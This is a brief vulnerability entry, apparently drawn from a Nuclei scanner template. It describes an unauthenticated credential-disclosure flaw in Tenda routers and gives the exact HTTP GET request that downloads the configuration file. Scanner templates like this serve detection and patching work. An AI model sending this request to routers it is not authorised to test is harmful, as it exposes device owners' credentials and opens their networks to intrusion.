# Vulnerability: Tenda Router - Credential Disclosure
**Classification:** TENDA
**Source:** Nuclei Template (`tenda-credential-disclosure.yaml`)

## Description
Tenda router allows unauthenticated users to download the configuration file containing sensitive credentials via the /cgi-bin/DownloadCfg/RouterCfm.jpg endpoint.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /cgi-bin/DownloadCfg/RouterCfm.jpg HTTP/1.1
Host: {{Hostname}}
```

